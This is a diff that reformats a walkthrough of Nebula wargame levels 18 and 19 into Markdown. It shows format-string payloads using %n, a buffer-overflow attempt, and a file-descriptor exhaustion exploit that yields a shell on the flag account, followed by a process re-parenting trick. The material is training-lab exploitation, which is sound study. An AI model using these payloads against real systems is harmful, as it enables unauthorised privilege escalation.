@@ -463,63 +463,45 @@ You have successfully executed getflag on a target account
 Nice! Any command can be injected this way.
 
 ### Level 18
-Here we have a vulnerable C program and we're told there are 3 ways to exploit it: an easy way, an intermediate way and a more difficult/unreliable way. First some things that didn't work (for me) and need further investigation
-There is a possible buffer overflow in the code that parses the input for the 'setuser' command:
-?
-1
-2
+Here we have a [vulnerable C program](https://exploit-exercises.com/nebula/level18/) and we're told there are 3 ways to exploit it: an easy way, an intermediate way and a more difficult/unreliable way. First some things that didn't work (for me) and need further investigation. There is a possible buffer overflow in the code that parses the input for the _`setuser`_ command:
+```c
 char msg[128];
 sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
+```
+
 But if we try to exploit it, there's a Fortify check in place, that would need to be bypassed (how?): 
-?
-1
-2
-3
-4
+```bash
 $ echo setuser `perl -e 'print "A"x200'` | /home/flag18/flag18
 *** buffer overflow detected ***: /home/flag18/flag18 terminated
 ======= Backtrace: =========
 /lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0x6ff8d5]
-Another thing I've noticed is the format strings vulnerability in the function that processes the 'site exec' commands: 
-?
-1
-2
-3
-4
-5
+```
+
+Another thing I've noticed is the [format strings vulnerability](https://www.exploit-db.com/docs/28476.pdf) in the function that processes the _`site exec`_ commands: 
+```c
 void notsupported(char *what)
 {
-...
+[..]
    dprintf(what);
 }
-This seems to be a subtle reference to SITE EXEC format string vulnerability in WU-FTPD 2.6.0. We  confirm this: 
-?
-1
-2
-3
+```
+
+This seems to be a subtle reference to [SITE EXEC format string vulnerability in WU-FTPD 2.6.0](https://www.rapid7.com/db/modules/exploit/multi/ftp/wuftpd_site_exec_format). We  confirm this: 
+```bash
 $ /home/flag18/flag18 -d deb -vvv
 site exec %s%s%s%s%s%s%s%s%s%s%s%s
 Segmentation fault
-But after analysing and crafting a payload to modify addresses (based on the great reference book by Jon Erickson, Hacking - The Art of Exploitation 2nd edition), I realized there's another Fortify protection that doesn't allow %n format parameter (seems that this could also by bypassed as described by Captain Planet in Phrack magazine). 
-?
-1
-2
-3
+```
+
+But after analysing and crafting a payload to modify addresses (based on the great reference book by [Jon Erickson, Hacking - The Art of Exploitation (2nd edition)](https://www.nostarch.com/hacking2.htm), I realized there's another Fortify protection that doesn't allow **`%n`** format parameter (seems that this could also by bypassed as described by [Captain Planet in Phrack magazine](http://www.phrack.org/issues.html?issue=67&id=9)):
+```bash
 level18@nebula:~$ echo -e site exec `perl -e 'print "AB"."\xb4\xb0\x04\x08"."%08x."x23,"%n"'` "\nsite exec" `perl -e 'print "AB"."\xb4\xb0\x04\x08"."%08x."x24'` | /home/flag18/flag18 -d /tmp/log -vvv
 *** %n in writable segment detected ***
 Aborted
+```
+
 The same protection restrict the overwriting of destructor method: 
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
+```bash
 level18@nebula:~$ nm /home/flag18/flag18 | grep DTOR
 0804af20 D __DTOR_END__
 0804af1c d __DTOR_LIST__
@@ -530,36 +512,17 @@ Contents of section .dtors:
 level18@nebula:~$ echo -e site exec `perl -e 'print "AB"."\x20\xaf\x04\x08"."%08x."x23,"%n"'` "\nsite exec" `perl -e 'print "AB"."\x20\xaf\x04\x08"."%08x."x24'` | /home/flag18/flag18 -d /tmp/log -vvv
 *** %n in writable segment detected ***
 Aborted
-No luck (something more than luck needed:) with these methods. We have forgotten the mentioned 'easy' way. As it was previously described here, the login() function opens a file, but never closes it, and in the case where the file couldn't be opened (maximum opened files reached), it will still set the globals.loggedin variable, that will allow to execute shell afterwards. So we will fill all the available file descriptors, after that close the file descriptor for the debug log (to free one file descriptor, otherwise we won't be able to execute out command that needs a file descriptor to open).
-We check for the maximum allowed opened files: 
-?
-1
-2
-3
+```
+
+No luck (something more than luck needed:) with these methods. But we have forgotten the mentioned _easy_ way. As it was previously described [here](http://vnico.mundodisco.net/archives/36), the login() function opens a file, but never closes it, and in the case where the file couldn't be opened (maximum opened files reached), it will still set the _`globals.loggedin`_ variable, that will allow us to execute a shell afterwards. So we will fill all the available file descriptors and after that close the file descriptor for the debug log (to free one file descriptor, otherwise we won't be able to execute out command that needs a file descriptor to open). We can check for the maximum allowed opened files: 
+```bash
 level18@nebula:~$ ulimit -a 
-[. . .]
+[..]
 open files                      (-n) 1024
+```
+
 Extracting the steps from the mentioned reference, we have: 
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
+```bash
 level18@nebula:~$ for i in {0..1030}; do echo "login test" >> /tmp/input; done
 level18@nebula:~$ echo "closelog" >> /tmp/input
 level18@nebula:~$ echo "shell" >> /tmp/input
@@ -576,11 +539,12 @@ PATH=/tmp:$PATH cat /tmp/input |/home/flag18/flag18 --init-file -d /tmp/debuglog
 /home/flag18/flag18: invalid option -- 'i'
 /home/flag18/flag18: invalid option -- 'l'
 /home/flag18/flag18: invalid option -- 'e'
-<b>You have successfully executed getflag on a target account</b>
+You have successfully executed getflag on a target account
 /tmp/debuglog: line 2: syntax error near unexpected token `('
 /tmp/debuglog: line 2: `logged in successfully (without password file)'
-Nice 
-Level 19
+```
+
+## Level 19
 This presents a program that executes a command only if its parent is the root process.  We can start flag19 binary from another process, then terminate the calling parent process before execve() in the child, without waiting for it, so the child becomes 'orphan'. An orphan process is a process whose parent process has finished or terminated, though it remains running itself. In a Unix-like operating system any orphaned process will be immediately adopted by the special init system process. This operation is called re-parenting and occurs automatically. The init process is started under the root username.
 Source of the calling process:
 ?
